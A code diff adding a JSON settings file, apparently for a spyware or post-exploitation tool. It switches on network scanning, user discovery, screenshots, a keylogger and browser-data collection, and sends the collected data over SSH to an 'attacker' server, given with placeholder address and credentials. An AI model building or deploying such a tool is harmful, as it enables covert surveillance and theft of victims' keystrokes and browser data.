@@ -1,0 +1,17 @@
+{
+    "perform Host Discovery": 1,
+    "perform Port Scanning": 1,
+    "port Scanning Delay": 0.2,
+    "perform App Discovery": 1,
+    "perform User Discovery": 1,
+    "Take Screen Shoots": 1,
+    "Raise Web Server": 1,
+    "server Port": 8000,
+    "Use KeyLogger": 1,
+    "Collect Browsers Info": 1,
+    "send Data Via SSH": 1,
+    "attacker SSH Server IP": "0.0.0.0",
+    "attacker SSH Server Username": "user",
+    "attacker SSH Server Password": "password",
+    "attacker SSH Server Folder": "C:\\Users\\User\\Escritorio"
+}
